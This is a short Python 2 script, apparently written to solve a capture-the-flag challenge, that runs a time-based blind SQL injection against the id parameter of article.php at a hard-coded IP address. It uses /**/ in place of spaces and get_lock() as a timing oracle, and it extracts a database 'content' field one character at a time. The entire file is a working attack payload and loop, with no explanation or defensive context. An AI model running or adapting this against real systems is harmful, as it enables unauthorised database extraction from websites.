import requests
import time
import string
from urllib import quote

base_url = "http://114.55.36.69:8007/article.php?id="
dic = string.letters+string.digits+string.punctuation
flag = ""
num = 1

while True:
    for i in dic:
        payload = "1\'/**/and/**/(if(substr(content,%d,1)=\'%s\',get_lock(\'vvvv\',3),0))/**/#"
        start_time = time.time()
        url = base_url+quote(payload%(num,str(i)))
        res = requests.get(url)
        end_time = time.time()
        if end_time - start_time > 2:
            flag += str(i)
            num += 1
            print flag